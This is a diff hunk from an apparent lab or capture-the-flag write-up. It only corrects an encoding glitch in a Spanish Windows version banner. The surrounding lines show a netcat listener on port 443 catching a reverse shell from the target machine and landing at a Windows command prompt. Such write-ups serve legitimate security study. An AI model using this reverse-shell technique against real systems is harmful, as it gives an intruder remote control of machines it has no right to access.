@@ -552,7 +552,7 @@ Then you can get the reverse shell
 └─$ nc -lnvp 443
 listening on [any] 443 ...
 connect to [10.10.14.5] from (UNKNOWN) [10.10.11.26] 52680
-Microsoft Windows [Versi�n 10.0.19045.4651]
+Microsoft Windows [Versión 10.0.19045.4651]
 (c) Microsoft Corporation. Todos los derechos reservados.
 
 C:\ProgramData\Microsoft\VisualStudio\SetupWMI>cd C:\
